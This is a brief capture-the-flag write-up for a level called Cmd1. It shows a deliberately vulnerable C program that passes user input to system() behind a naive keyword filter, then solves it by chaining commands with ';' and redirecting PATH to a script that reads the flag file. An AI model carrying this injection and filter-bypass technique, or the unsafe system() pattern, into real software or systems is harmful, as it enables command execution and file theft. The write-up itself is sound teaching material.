# Cmd1

Let's take a look at the code:

```c
int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}

int main(int argc, char* argv[], char** envp){
	putenv("PATH=/fuckyouverymuch");
	if(filter(argv[1])) return 0;
	system(argv[1]);
	return 0;
}
```

We have access to `system()` and wish to read the flag, but our command can't include the words "flag", "tmp" or "sh". Besides that we can't run anything without providing the full path, once our PATH is messed up.

The good thing is: we can issue multiple commands separated by `;`. Perhaps we can bypass the filter using bash variables, commands or substitutions.

The PWD variable holds the current working directory. We can go to /tmp and use it to change our PATH and get the flag:

```bash
$ mkdir /tmp/cmd
$ cd /tmp/cmd
$ echo "/bin/cat ~/flag" > prog
$ chmod +x prog
$ ~/cmd1 "PATH=\$PWD:\$PATH; prog"
```

This level has many other solutions, some of which are way simpler. Feel free to experiment different things.
